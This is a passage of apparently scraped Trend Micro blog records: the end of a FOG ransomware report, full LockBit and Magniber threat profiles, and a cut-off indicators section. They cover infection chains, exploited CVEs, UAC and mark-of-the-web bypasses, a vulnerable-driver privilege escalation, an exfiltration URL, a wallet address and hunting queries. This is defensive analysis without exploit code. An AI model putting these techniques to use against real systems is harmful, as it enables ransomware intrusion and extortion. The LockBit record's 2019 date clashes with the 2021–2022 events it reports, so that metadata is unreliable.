spread the ransomware payload to other computers by pasting the provided code in the note.\nThe ransomware payload embedded in the samples has been verified as FOG ransomware, an active ransomware family targeting both individuals and organizations.\nOur review of their leak site reveals that FOG ransomware has had 100 victims since January this year; with the most victim counts in February at 53.\nThe group declared 18 and 29 victims in January and March respectively.\nThey also declared in their leak site that their victims come from the technology, education, manufacturing and transportation sectors.\nOther victim sectors include enterprises from business services, healthcare, retail, and consumer services.\nSince June 2024, our threat intelligence has detected 173 counts of ransomware activity attributed to FOG ransomware among Trend customers.\nThese detections have since been blocked.\nThe campaigns in this blog are carried out either by the original FOG ransomware operators and potentially using DOGE-related references to troll users, or by other actors embedding FOG ransomware into their binaries for impersonation.\nInitial access We observed that an LNK file contained in a ZIP file named “Pay Adjustment.zip” is being distributed via email and phishing attacks.\nOnce clicked, the file will execute the following command by downloading a PowerShell script named “stage1.ps1”.\nSimilarly, the deobfuscated script in ransom note also executes the same PowerShell command by downloading and running the “stage1.ps1”.\nThe downloaded PowerShell script “stage1.ps1” performs a multi-stage operation, retrieving a ransomware loader (cwiper.exe), ktool.exe and other PowerShell scripts.\nIt also opens politically themed YouTube videos and includes written political commentary directly in the script.\nPayload contents In the following section, we discuss other files we found in the payload samples investigated: - This script collects system information and exfiltrate it to a remote server. -\nIt also fetches IPv4 gateway IP, finds a MAC address and uses Wigle API to get the infected system’s geolocation. -\nIt also harvests hardware and system-level information from the host, such as the IP address, CPU configuration, and additional system identifiers. -\nLootsubmit.ps1 also sends all collected data to hxxps://hilarious-trifle-d9182e.netlify[.]app - This script contains base64 encoded code and is XOR’ed to 85 - This script is similar to lootsubmit.ps1, but with an updated Get-GatewayMACs function that includes ARP lookup for MAC address resolution. -\nOpens a QR code that directs to a Monero wallet address: 8BejUQh2TAA5rUz3375hHM7JT8ND2i4u5hkVXc9Bcdw1PTrCrrDzayWBj6roJsE1EWBPGU4PMKohHWZUMopE8WkY7iA6UC1 - Ktool.exe facilitates privilege escalation by exploiting the vulnerable Intel Network Adapter Diagnostic Driver, iQVW64.sys.\nThis driver is embedded within the binary and will be extracted to the %TEMP% folder.\nTo utilize this feature, the target process ID (PID) and a hardcoded key \"fd6c57fa3852aec8\" is provided as parameters.\nDropper analysis We have observed that prior to dropping its payload, the malware investigated checks various indicators, such as processor count, RAM, MAC address, registry, and tick count, to detect a sandbox.\nIf any check fails, it exits the process; otherwise, it logs that no sandbox is detected.\nWe also observed that the encrypted binary is embedded within the data section of the loader, which will then be decrypted using a specified key using the function shown in Figure 9.\nThe loader also drops dbgLog.sys, a log file that records encryption-related events, just like previous versions of FOG ransomware.\nAdditionally, it drops a readme.txt file, which contains the ransom note identical to ones observed to have been previously used by FOG ransomware.\nThe ransomware payload embedded in the discovered samples has been verified as FOG ransomware and is detected as Ransom.\nWin32.FOG.SMYPEFG.\nAll discovered variants carry the same payload and only differ on the key used to decrypt the payload.\nConclusion and security recommendations FOG ransomware is a relatively new ransomware family that enterprises must add to their watchlist.\nRegardless of the origins and motivations behind the FOG ransomware samples we investigated, whether executed by the original operators using DOGE references for trolling purposes or by other actors embedding FOG ransomware into their binaries for impersonation, the impact of a successful ransomware attack could still potentially cost enterprises financial loss and operational disruption.\nOutpace ransomware threats by monitoring indicators of compromise (IoCs) as part of a proactive cybersecurity defense.\nThis approach allows for early detection of threats, enhances security measures, supports forensic investigations, effectively disrupting the activities of cybercriminals.\nFor researchers, tracking IoCs offers valuable insights into attack patterns, which can help them develop more effective threat prevention strategies.\nSOCs should maximize tools that enable and help automate these tasks.\nEnterprises can also implement the following security best practices: - Maintain up-to-date, secure backups of all critical data.\nRegularly test restoration processes to ensure data can be recovered quickly in the event of an attack. -\nImplement network segmentation to limit the spread of ransomware across your organization.\nBy isolating sensitive data and critical systems, you can prevent widespread damage. -\nRegularly update and patch application software, operating systems, and other applications to ensure that you close vulnerabilities that attackers could exploit. -\nConduct regular training sessions for employees to recognize phishing attempts and suspicious links.\nProactive security with Trend Vision One™ Trend Vision One™ is the only AI-powered enterprise cybersecurity platform that centralizes cyber risk exposure management, security operations, and robust layered protection.\nThis comprehensive approach helps you predict and prevent threats, accelerating proactive security outcomes across your entire digital estate.\nBacked by decades of cybersecurity leadership and Trend Cybertron, the industry's first proactive cybersecurity AI, it delivers proven results: a 92% reduction in ransomware risk and a 99% reduction in detection time.\nSecurity leaders can benchmark their posture and showcase continuous improvement to stakeholders.\nWith Trend Vision One, you’re enabled to eliminate security blind spots, focus on what matters most, and elevate security into a strategic partner for innovation.\nTrend Vision One Threat Intelligence To stay ahead of evolving threats, Trend Vision One customers can access a range of Intelligence Reports and Threat Insights.\nThreat Insights helps customers stay ahead of cyber threats before they happen and allows them to prepare for emerging threats by offering comprehensive information on threat actors, their malicious activities, and their techniques.\nBy leveraging this intelligence, customers can take proactive steps to protect their environments, mitigate risks, and effectively respond to threats.\nTrend Vision One Intelligence Reports App [IOC Sweeping] Fog Ransomware Concealed Within 'Trolling DOGE' Binary Loader Trend Vision One Threat Insights App Emerging Threats: Fog Ransomware Concelaed Within Trolling DOGE Binary Loader Hunting Queries Trend Vision One customers can use the Search App to match or hunt the malicious indicators mentioned in this blog post with data in their environment.\neventSubId: 101 AND objectFilePath: RANSOMNOTE.txt Encrypted File Activity Detected (*.flocked) eventSubId: 109 AND objectFilePath: /\\.flocked$/ Ransomware Note Dropped in System Folders (readme.txt) eventSubId: 101 AND objectFilePath: /Users\\\\(Defaullt|Public)\\\\.*readme.txt/ More hunting queries are available for Trend Vision One customers with Threat Insights Entitlement enabled.\nIndicators of Compromise (IoC) Download the list of IoCs here.","num_sentences":59,"metadata":{"source":"blog","platform":"trendmicro","filename":"Fog"}}
{"id":192,"title":"Ransomware Spotlight: LockBit | Trend Micro (US)","publish_date":"2019-09-28","link":"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-lockbit","clean_text":"Ransomware Spotlight: LockBit The impact of LockBit and insights from Water Selkie Our investigation into the intrusion set behind LockBit, which we track as Water Selkie, reveals the effectiveness and impact of the tactics we have discussed.\nThe key takeaways are the following: - The malware’s performance is a strong selling point.\nThe malware’s speed and capabilities are widely known because the group uses them as selling points.\nThe threat group’s efforts to publicize their malware’s capabilities have established it as the ransomware with one of the fastest and most efficient encryption methods. -\nIt considers external pressures and issues faced by its potential targets.\nWater Selkie’s operators have indicated a preference for victims in Europe who fear breaching EU’s General Data Protection Regulation (GDPR).\nThey continue to also consider the US to have lucrative targets, but see that data privacy laws can affect their chances of getting a successful payout.\nIn general, they are attuned to geopolitical issues that they can use to their advantage. -\nBanks on the strength of its affiliate program.\nAs mentioned earlier, a contributing factor in LockBit’s success is how well it recruits trustworthy and capable affiliates.\nEvidence also suggests that several of its affiliates are involved in multiple RaaS operations, which helps Water Selkie innovate and keep up with its competition.\nIn return, Water Selkie prides itself on its professional operation that can be trusted by affiliates. -\nIt has more in store for the future.\nWater Selkie clearly ramped up operations in the second half of 2021.\nWe see that the intrusion set will either maintain or increase their level of activity in the first half of 2022.\nOrganizations should also expect more supply chain attacks in the future according to an interview conducted with one of LockBit’s operators.\nWith LockBit affiliates being likely involved in other RaaS operations, its tactics slipping into those of other ransomware groups isn’t a far-fetched notion.\nOrganizations would therefore benefit from recognizing LockBit’s tactics, techniques, and procedures (TTPs) laid out in the next sections.\nTop affected industries and countries In this section, we discuss Trend Micro™ Smart Protection Network™ data, which are detections of LockBit attempts to compromise organizations.\nLockBit has been detected all over the globe, with the US seeing most of the attack attempts from June 2021 to January 20, 2022, followed by India and Brazil.\nLike many ransomware families LockBit avoids Commonwealth of Independent States (CIS) countries.\nFigure 2.\nCountries with the highest number of attack attempts per machine for LockBit ransomware (July 1, 2021 to January 20, 2022) Source: Trend Micro™ Smart Protection Network™ infrastructure We saw the most LockBit-related detections in the healthcare industry followed by the education sector.\nLockBit threat actors have claimed that they do not attack healthcare, educational, and charity institutions.\nThis “contradictory code of ethics,” has been noted by the US Department of Health Services (HHS) who warns the public not to rely on such statements as these tend to dissolve in the face of easy targets.\nFigure 3.\nIndustries with the highest number of attack attempts per machine for LockBit ransomware (July 1, 2021 to January 20, 2022) Source: Trend Micro Smart Protection Network infrastructure Targeted regions and sectors according to LockBit leak site In this section, we examine the number of attacks recorded on LockBit’s leak site, which represents successfully compromised organizations who, as of writing, have refused to pay ransom.\nIn our foray into the leak site of LockBit operators from December 16, 2021 to January 15, 2022, we observed that they had the highest number of recorded victims among active ransomware groups at 41, followed by Conti at 29.\nDo note, however, that LockBit has been accused of artificially inflating the number of their victims.\nLooking into the list of their victims, it appears that more than half of the organizations are based in North America, followed by Europe and Asia Pacific.\nFigure 5.\nRegional distribution of LockBit victims according to the group’s leak site (December 16, 2021 to January 15, 2022) LockBit targets organizations indiscriminately, in that their victims come from many different sectors compared to other groups.\nIn the abovementioned time period, they have victims coming from financial, professional services, manufacturing, and construction sectors, just to name a few.\nThe majority of LockBit’s victims have been either small or small and medium-size businesses (SMBs) – 65.9% and 14.6% respectively, with enterprises only comprising 19.5%.\nThat’s at odds with a group like Conti who victimized 44.8% of enterprises and 34.5% SMBs, and only victimized 20.7% of small businesses.\nFigure 6.\nSector distribution of LockBit victims according to the group’s leak site (December 16, 2021 to January 15, 2022) In our observation of the activities within the LockBit leak site for the same time period, majority of attacks took place during weekdays, approximately 78% of the total, while 22% happened during the weekend.\nInfection chain and techniques Operating as a RaaS, LockBit infection chains show a variety of tactics and tools employed, depending on the affiliates involved in the attack.\nAffiliates typically buy access to targets from other threat actors, who typically obtain it via phishing, exploiting vulnerable apps, or brute forcing remote desktop protocol (RDP) accounts.\nHere are some of the observed infection flows of LockBit variants: Figure 7.\nA LockBit 1.0 campaign that used PowerShell Empire to perform command and control after gaining access to the system Figure 8.\nA LockBit 1.0 campaign that used Microsoft RAS to access other systems Figure 9.\nA LockBit 1.0 campaign that used Meterpreter to perform command and control after gaining access to the system Figure 10.\nA LockBit 1.0 campaign that did not involve any network scanning as it directly deployed the payload after gaining access to the system Figure 11.\nLockBit 2.0 infection chain that uses StealBit for automated data exfiltration Figure 12.\nLockBit 3.0 infection chain that uses Cobeacon and KillAV Initial Access - LockBit operators mostly gain access via compromised servers or RDP accounts that are usually bought or obtained from affiliates. -\nIn some instances, it arrived via spam email or by brute forcing insecure RDP or VPN credentials. -\nIt can also arrive via exploiting Fortinet VPN’s CVE-2018-13379 vulnerability.\nExecution - LockBit is usually executed via command line as it accepts parameters of file path or directories if desired to only encrypt specific paths. -\nIt may also be executed via created scheduled tasks.\nThis is usually the case if it is propagated in other machines. -\nThere are also reports of it being executed using PowerShell Empire, a pure PowerShell post-exploitation agent.\nCredential Access - Aside from using credentials obtained from affiliates.\nLockBit attacks were also observed using Mimikatz to further gather credentials.\nDefense Evasion - Some infections were observed to have GMER, PC Hunter, and/or Process Hacker.\nThese are tools that are usually used to disable security products. -\nIn some observed attacks, a Group Policy was created to disable Windows Defender.\nDiscovery - Network Scanner, Advanced Port Scanner, and AdFind were also used to enumerate connected machines in the network.\nProbably to locate the Domain Controller or Active Directory server as these are usually the best targets for deploying ransomware with network encryption or propagation.\nLateral Movement - LockBit can self-propagate via SMB connection using obtained credentials. -\nSome samples can self-propagate and execute via Group Policy. -\nIn some instances, PsExec or Cobalt Strike were used to move laterally within the network.\nExfiltration - Uploads stolen files via cloud storage tools like MEGA or FreeFileSync. -\nSometimes, the StealBit malware (also sold by the threat actors) was used instead to exfiltrate stolen files.\nImpact - The ransomware payload will proceed with encryption routine upon execution.\nEncryption includes both local and network encryption. -\nIt encrypts files using AES and encrypts AES key with RSA encryption.\nThe AES Key is generated using BCryptGenRandom. -\nFor faster encryption, it only encrypts the first 4KB of a file and appends it to “.lockbit.” -\nIt will also replace the desktop wallpaper with a note that includes a statement where it tries to recruit insiders or affiliates within companies.\nFigure 12.\nSample wallpaper used by LockBit - LockBit also sends a WoL packet to ensure that network drives are active for its network encryption; this behavior was first observed on the Ryuk ransomware. -\nLockBit also has the capability to print its ransom note using connected printers using WinSpool APIs, which is probably inspired by Egregor ransomware.\nMITRE tactics and techniques | Initial Access | Execution | Persistence | Privilege Escalation | Defense Evasion | Discovery | Lateral Movement | Exfiltration | Impact | |---|---|---|---|---|---|---|---|---| T1566 - Phishing T1190 - Exploit public-facing application T1078 - Valid accounts T1106 - Execution through API | T1059 - Command and scripting interpreter T1204 - User execution | T1547 - Boot or logon autostart execution Creates registry run entries | T1134 - Access token manipulation Use AdjustTokenPrivilege API to modify token attribute to SE_PRIVILEGE_ENABLED T1548 - Abuse Elevation Control Mechanism | T1140 - Deobfuscate/Decode Files or Information T1562 - Impair defenses T1574 - Hijack execution flow T1218 - Signed Binary Proxy Execution T1484 - Domain Policy Modification T1070 - Indicator Removal on Host | T1083 - File and directory discovery T1135 - Network Share Discovery T1018 - Remote system discovery T1057 - Process discovery | T1570 - Lateral tool transfer | T1567 - Exfiltration over web service T1041 - Exfiltration Over C2 Channel | T1486 - Data encrypted for impact T1489 - Service stop T1491 - Defacement | Summary of malware, tools, and exploits used Security teams can watch out for the presence of the following malware tools and exploits that are typically used in LockBit attacks: | Initial Entry | Execution | Discovery | Lateral Movement | Defense Evasion | Exfiltration | |---|---|---|---|---|---| | | | | | | Recommendations As mentioned earlier, we expect the LockBit to continue its level of activity, if not increase it in the coming months.\nFrom our discussion, LockBit also demonstrates both consistent and versatile operations that adapt to current trends that affect the threat landscape.\nOrganizations therefore should also keep abreast of the latest shifts that could influence their own security measures.\nTo help defend systems against similar threats, organizations can establish security frameworks that can allocate resources systematically for establishing a solid defense against ransomware.\nHere are some best practices that can be included in these frameworks: Audit and inventory - Take an inventory of assets and data - Identify authorized and unauthorized devices and software - Make an audit of event and incident logs Configure and monitor - Manage hardware and software configurations - Grant admin privileges and access only when necessary to an employee’s role - Monitor network ports, protocols, and services - Activate security configurations on network infrastructure devices such as firewalls and routers - Establish a software allow list that only executes legitimate applications Patch and update - Conduct regular vulnerability assessments - Perform patching or virtual patching for operating systems and applications - Update software and applications to their latest versions Protect and recover - Implement data protection, backup, and recovery measures - Enable multifactor authentication (MFA) Secure and defend - Employ sandbox analysis to block malicious emails - Deploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network - Detect early signs of an attack such as the presence of suspicious tools in the system - Use advanced detection technologies such as those powered by AI and machine learning Train and test - Regularly train and assess employees on security skills - Conduct red-team exercises and penetration tests A multilayered approach can help organizations guard the possible entry points into the system (endpoint, email, web, and network).\nSecurity solutions can detect malicious components and suspicious behavior could help protect enterprises. -\nTrend Micro Vision One™ provides multilayered protection and behavior detection, which helps block questionable behavior and tools early on before the ransomware can do irreversible damage to the system. -\nTrend Micro Cloud One™ Workload Security protects systems against both known and unknown threats that exploit vulnerabilities.\nThis protection is made possible through techniques such as virtual patching and machine learning. -\nTrend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block malicious emails, including phishing emails that can serve as entry points for ransomware. -\nTrend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats and ransomware, ensuring the protection of endpoints.\nIndicators of Compromise (IOCs) The IOCs for this article can be found here.\nActual indicators might vary per attack.\nLike it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":97,"metadata":{"source":"blog","platform":"trendmicro","filename":"LockBit"}}
{"id":193,"title":"Ransomware Spotlight: Magniber | Trend Micro (US)","publish_date":"2022-10-28","link":"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-magniber","clean_text":"Ransomware Spotlight: Magniber Top affected countries and industries according to Trend Micro data In this section, we examine the Magniber ransomware’s attempts to compromise organizations in 2022 based on Trend Micro™ Smart Protection Network™ country and regional data.\nIt’s important to note that this data covers only Trend Micro customers and does not contain all victims of Magniber.\nMalicious attackers behind Magniber started slow in 2022, with less than 20 attacks per month in the first quarter of the year.\nThe attack attempts steadily increased as the year progressed, with attackers making the most of September 2022, which recorded the largest number of attack attempts at 1,482 detections.\nAttack attempts diminished during the last quarter of the year but remained high with 508 detections in December.\nThe following figure details the total number of attempted attacks by Magniber in 2022.\nThe highest number of Magniber attacks was detected in Taiwan with a total of 204 attack attempts, which makes up most of the attack attempt detections at approximately 76.1% of the total.\nSouth Korea, initially targeted by Magniber when it was first detected, has the second most attack attempts with a large margin at 15, followed by Australia with nine.\nTurkey and Japan follow with six detections each.\nOur data shows that Magniber has expanded its targets beyond Asian countries.\nNote that the data in Figure 2 is limited to feedback provided by customers, majority of whom preferred not to disclose their locations.\nIndustry data, on the other hand, showed that educational organizations, the government, and manufacturing industries experienced the largest number of Magniber ransomware attack attempts, followed by the healthcare and technology industries.\nOther industries that experienced less attempted attacks were the energy, transportation, and real estate industries.\nIn total, there were 987 total detections of Magniber attack attempts across industries in 2022 from customer feedback detailing the industries in which they belong.\nInfection chain and techniques We found that the Magniber ransomware exploits different vulnerabilities, but while it uses a more straightforward kill chain compared to the newer double-extortion ransomware campaigns, its simplicity does not make it any less effective.\nThe following figure details various vulnerabilities exploited to deliver its payload: Figure 4.\nVulnerabilities exploited to deliver Magniber ransomware Initial Access - Magniber threat actors leverage different vulnerabilities for initial access such as the aforementioned Magnitude exploit kit (CVE-2016-0189, CVE-2018-8174, and CVE-2019-1367), the Internet Explorer Scripting Engine Memory Corruption Vulnerability (CVE-2020-0968), the Internet Explorer Memory Corruption Vulnerability (CVE-2021-26411), the Internet Explorer remote code execution (RCE) vulnerability in MSHTML (CVE-2021-40444), and PrintNightmare (CVE-2021-34527).\nCommand and Control - Magniber has the capability to send collected information to its command and control (C&C) and the payment browser.\nDefense Evasion - Magniber injects itself to all processes except iexplore.exe and excluding system and processes not running in a WoW64 environment.\nThe ransomware uses NtQuerySystemInformation API to obtain running processes in the machine. -\nRecent Magniber infections leverage fake installers (.msi) by calling the encrypted ransomware DLL through the CustomAction table, as well as the CPL file format to execute its payload. -\nMagniber uses a malformed digital signature block to bypass execution blocks by MOTW.\nRecently, it was found exploiting CVE-2022-44698 to bypass MOTW with a fake digital signature. -\nIt uses a file detected as Fodscript that drops a script file to delete shadow copies from the target machine.\nDiscovery - Magniber uses NtQuerySystemInformation API to obtain running processes in the machine. -\nIt searches for specific files, folders, and attributes and encrypts them if they match its specified criteria.\nPrivilege Escalation - Magniber uses a file detected as Fodscript that drops two script files: One of the script files modifies the registry entries that fodhelper.exe checks in order to manipulate fodhelper.exe into executing the second script with high privilege and bypassing UAC.\nCollection, Exfiltration - As of now, there are no data exfiltration and leaks being done by Magniber.\nImpact - The final ransomware binary would then be deployed, thereby ensuring that files are encrypted in the machine.\nIt also ensures that shadow copies are deleted to inhibit system recovery. -\nIt initially encrypts target files via symmetric AES, then encrypts the AES symmetric key and IV via RSA using CryptoAPIs.\nIt encrypts equal-size data blocks (1,048,576 bytes) per iteration until the final block is encrypted. -\nIt appends the mutex name as its appended extension. -\nIt can also delete shadow copies in the infected machine.\nOther technical details - Magniber encrypts files with the following extensions: - .abm - .abs - .abw - .accdb - .act - .adn - .adp - .aes - .aft - .afx - .agif - .agp - .ahd - .ai - .aic - .aim - .albm - .alf - .ans - .apd - .apm - .apng - .aps - .apt - .apx - .arc - .art - .arw - .asc - .ase - .asf - .ask - .asm - .asp - .asw - .asy - .aty - .avi - .awdb - .awp - .awt - .aww - .azz - .bad - .bak - .bay - .bbs - .bdb - .bdp - .bdr - .bean - .bib - .bmp - .bmx - .bna - .bnd - .boc - .bok - .brd - .brk - .brn - .brt - .bss - .btd - .bti - .btr - .c - .ca - .cals - .can - .cd - .cdb - .cdc - .cdg - .cdmm - .cdmt - .cdmz - .cdr - .cdt - .cf - .cfu - .cgm - .cimg - .cin - .cit - .ckp - .class - .clkw - .cma - .cmx - .cnm - .cnv - .colz - .cpc - .cpd - .cpg - .cpp - .cps - .cpx - .crd - .crt - .crw - .cs - .csr - .csv - .csy - .ct - .cvg - .cvi - .cvs - .cvx - .cwt - .cxf - .cyi - .dad - .daf - .db - .dbc - .dbf - .dbk - .dbs - .dbt - .dbv - .dbx - .dca - .dcb - .dch - .dcr - .dcs - .dct - .dcx - .dd - .dds - .ded - .der - .dgn - .dgs - .dgt - .dhs - .dib - .dif - .dip - .diz - .djv - .djvu - .dmi - .dmo - .dnc - .dne - .doc - .docb - .docm - .docx - .docz - .dot - .dotm - .dotx - .dpp - .dpx - .dqy - .drw - .drz - .dsk - .dsn - .dsv - .dt - .dta - .dtsx - .dtw - .dv - .dvi - .dwg - .dx - .dxb - .dxf - .eco - .ecw - .ecx - .edb - .efd - .egc - .eio - .eip - .eit - .em - .emd - .emf - .emlx - .ep - .epf - .epp - .eps - .epsf - .eq - .erf - .err - .etf - .etx - .euc - .exr - .fa - .faq - .fax - .fb - .fbx - .fcd - .fcf - .fdf - .fdr - .fds - .fdt - .fdx - .fdxt - .fes - .fft - .fi - .fic - .fid - .fif - .fig - .fla - .flr - .flv - .fmv - .fo - .fodt - .fpos - .fpt - .fpx - .frm - .frt - .frx - .ftn - .fwdn - .fxc - .fxg - .fzb - .fzv - .gcdp - .gdb - .gdoc - .gem - .geo - .gfb - .gfie - .ggr - .gif - .gih - .gim - .gio - .glox - .gpd - .gpg - .gpn - .gro - .grob - .grs - .gsd - .gthr - .gtp - .gv - .gwi - .gz - .h - .hbk - .hdb - .hdp - .hdr - .hht - .his - .hp - .hpg - .hpi - .hs - .htc - .hwp - .hz - .ib - .ibd - .icn - .icon - .icpr - .idc - .idea - .idx - .igt - .igx - .ihx - .ii - .iiq - .imd - .info - .ink - .ipf - .ipx - .iso - .itdb - .itw - .iwi - .j - .jar - .jas - .java - .jbig - .jbmp - .jbr - .jfif - .jia - .jis - .jng - .joe - .jpe - .jpeg - .jpg - .jps - .jpx - .jrtf - .js - .jsp - .jtf - .jtx - .jw - .jxr - .kdb - .kdbx - .kdc - .kdi - .kdk - .kes - .ke - .kic - .klg - .knt - .kon - .kpg - .kwd - .lay - .lbm - .lbt - .ldf - .lgc - .lis - .lit - .ljp - .lmk - .lnt - .lrc - .lst - .ltr - .ltx - .lue - .luf - .lwo - .lwp - .lws - .lyt - .lyx - .ma - .mac - .man - .map - .maq - .mat - .max - .mb - .mbm - .mbox - .mdb - .mdf - .mdn - .mdt - .me - .mef - .mel - .mft - .mgcb - .mgmf - .mgmt - .mgmx - .mgtx - .mid - .min - .mkv - .mm - .mmat - .mnr - .mnt - .mos - .mov - .mpeg - .mpf - .mpg - .mpo - .mrg - .mrxs - .msg - .mud - .mwb - .mwp - .mx - .my - .myd - .myi - .ncr - .nct - .ndf - .nef - .nfo - .njx - .nlm - .now - .nrw - .nsf - .nyf - .nzb - .obj - .oce - .oci - .ocr - .odb - .odg - .odm - .odo - .odp - .ods - .odt - .of - .oft - .omf - .oplc - .oqy - .ora - .orf - .ort - .orx - .ost - .ota - .otg - .oti - .otp - .ots - .ott - .ovp - .ovr - .owc - .owg - .oyx - .ozb - .ozj - .ozt - .p - .pa - .pan - .pano - .pap - .paq - .pas - .pbm - .pcd - .pcs - .pdb - .pdd - .pdm - .pds - .pdt - .pef - .pem - .pff - .pfi - .pfs - .pfv - .pfx - .pgf - .pgm - .phm - .php - .pic - .pict - .pix - .pjpg - .pjt - .plt - .pm - .pmg - .png - .pni - .pnm - .pntg - .pnz - .pobj - .pop - .pot - .potm - .potx - .ppam - .ppm - .pps - .ppsm - .ppsx - .ppt - .pptm - .pptx - .prt - .prw - .psd - .psdx - .pse - .psid - .psp - .pst - .psw - .ptg - .pth - .ptx - .pu - .pvj - .pvm - .pvr - .pwa - .pwi - .pwr - .px - .pxr - .pza - .pzp - .pzs - .qd - .qmg - .qpx - .qry - .qvd - .rad - .rar - .ras - .raw - .rb - .rctd - .rcu - .rd - .rdb - .rft - .rgb - .rgf - .rib - .ric - .riff - .ris - .rix - .rle - .rli - .rng - .rpd - .rpf - .rpt - .rri - .rs - .rsb - .rsd - .rsr - .rst - .rt - .rtd - .rtf - .rtx - .run - .rw - .rzk - .rzn - .saf - .sam - .sbf - .scad - .scc - .sch - .sci - .scm - .sct - .scv - .scw - .sdb - .sdf - .sdm - .sdoc - .sdw - .sep - .sfc - .sfw - .sgm - .sh - .sig - .skm - .sla - .sld - .sldm - .sldx - .slk - .sln - .sls - .smf - .sms - .snt - .sob - .spa - .spe - .sph - .spj - .spp - .spq - .spr - .sq - .sqb - .srw - .ssa - .ssk - .st - .stc - .std - .sti - .stm - .stn - .stp - .str - .stw - .sty - .sub - .suo - .svf - .svg - .svgz - .swf - .sxc - .sxd - .sxg - .sxi - .sxm - .sxw - .tab - .tar - .tbk - .tcx - .tdf - .tdt - .te - .tex - .text - .tgz - .thp - .tif - .tiff - .tlb - .tlc - .tm - .tmd - .tmv - .tmx - .tne - .tpc - .trm - .tvj - .udb - .ufr - .unx - .uof - .uop - .uot - .upd - .usr - .utxt - .vb - .vbr - .vbs - .vcd - .vct - .vdb - .vdi - .vec - .vm - .vmdk - .vmx - .vnt - .vob - .vpd - .vrm - .vrp - .vsd - .vsdm - .vsdx - .vsm - .vstm - .vstx - .vue - .vw - .wav - .wbk - .wcf - .wdb - .wgz - .wire - .wks - .wma - .wmdb - .wmv - .wn - .wp - .wpa - .wpd - .wpg - .wps - .wpt - .wpw - .wri - .wsc - .wsd - .wsh - .wtx - .x - .xar - .xd - .xdb - .xlc - .xld - .xlf - .xlgc - .xlm - .xls - .xlsb - .xlsm - .xlsx - .xlt - .xltm - .xltx - .xlw - .xps - .xwp - .xyp - .xyw - .ya - .ybk - .ym - .zabw - .zdb - .zdc - .zip - .zw The following diagrams detail the Magniber ransomware infection chains we observed when malicious attackers exploit Internet Explorer, MSI installer, and JS, JSE, and WSF installer vulnerabilities.\nFigure 5.\nMagniber ransomware infection chain involving the Internet Explorer Memory Corruption Vulnerability MITRE tactics and techniques | Initial Access | Execution | Defense Evasion | Discovery | Command and Control | Impact | Resource Development | |---|---|---|---|---|---|---| T1190 - Exploit Public-Facing Application | T1059.003 - Command and Scripting Interpreter: Windows Command Shell T1047 - Windows Management Instrumentation T1059.007 - Command and Scripting Interpreter: JavaScript T1204 - User Execution T1203 - Exploitation for Client Execution | T1218.010 - Signed Binary Proxy Execution: Regsvr32 T1055.003 - Process Injection: Thread Execution Hijacking T1140 - Deobfuscate/Decode Files or Information T1112 - Modify Registry T1218.007 - System Binary Proxy Execution: Msiexec T1218.002 - System Binary Proxy Execution: Control Panel T1036.005 - Masquerading: Match Legitimate Name or Location T1620 - Reflective Code Loading T1553.005 - Subvert Trust Controls: Mark-of-the-Web Bypass | T1083 - File and Directory Discovery T1135 - Network Share Discovery T1057 - Process Discovery T1082 - System Information Discover | T1071.001 - Application Layer Protocol: Web Protocols | T1490 - Inhibit System Recovery T1486 - Data Encrypted for Impact | T1608.005 - Stage Capabilities: Link Target | Summary of malware, tools, and exploits used Security teams must take not of and be on the lookout for the following tools and exploits typically used in Magniber ransomware attacks: Exploits - CVE-2016-0189 - CVE-2018-8174 - CVE-2019-1367 - CVE-2020-0968 - CVE-2021-26411 - CVE-2021-40444 - CVE-2021-34527 - CVE-2022-44698 Tools - WMI Malware - Fodscript | Initial Access | Execution | Defense Evasion | Privilege Escalation | Impact | |---|---|---|---|---| | | | | | | | ||| | |||| | |||| | |||| | |||| | Recommendations Given its continued activity in 2022, we can expect to see more of the Magniber ransomware in the future.\nAs attackers continue to find ways to distribute its payloads and circumvent security warnings, organizations and their members must remain vigilant to prevent being compromised.\nWe encourage organizations to remain on the lookout for the Magniber ransomware and continue monitoring its evolution to minimize the possibility of a successful attack.\nTo protect systems against the Magniber ransomware and other similar threats, organizations can implement security frameworks that allocate resources systematically to establish a strong defense strategy.\nHere are some best practices that organizations can consider to help protect themselves from the Magniber ransomware infection: Audit and inventory - Take an inventory of assets and data. -\nIdentify authorized and unauthorized devices and software. -\nAudit event and incident logs.\nConfigure and monitor - Manage hardware and software configurations. -\nGrant admin privileges and access only when necessary to an employee’s role. -\nMonitor network ports, protocols, and services. -\nActivate security configurations on network infrastructure devices such as firewalls and routers. -\nEstablish a software allowlist that only executes legitimate applications.\nPatch and update - Conduct regular vulnerability assessments. -\nPerform patching or virtual patching for operating systems and applications. -\nUpdate software and applications to their latest versions.\nProtect and recover - Implement data protection, back up, and recovery measures. -\nEnable multifactor authentication (MFA).\nSecure and defend - Employ sandbox analysis to block malicious emails. -\nDeploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network. -\nDiscover early signs of an attack, such as the presence of suspicious tools in the system. -\nUse advanced detection technologies such as those powered by AI and machine learning.\nTrain and test - Regularly train and assess employees on security skills. -\nConduct red-team exercises and penetration tests.\nA multilayered approach can help organizations guard possible entry points into the system (endpoint, email, web, and network).\nSecurity solutions that can detect malicious components and suspicious behavior can also help protect enterprises. -\nTrend Micro Vision One™ provides multilayered protection and behavior detection, which helps block questionable behavior and tools early on before the ransomware can do irreversible damage to the system. -\nTrend Micro Cloud One™ - Workload Security protects systems against both known and unknown threats that exploit vulnerabilities.\nThis protection is made possible through techniques such as virtual patching and machine learning. -\nTrend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block malicious emails, including phishing emails that can serve as entry points for ransomware. -\nTrend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats and ransomware, ensuring the protection of endpoints.\nIndicators of Compromise (IOCs) The IOCs for this article can be found here.\nActual 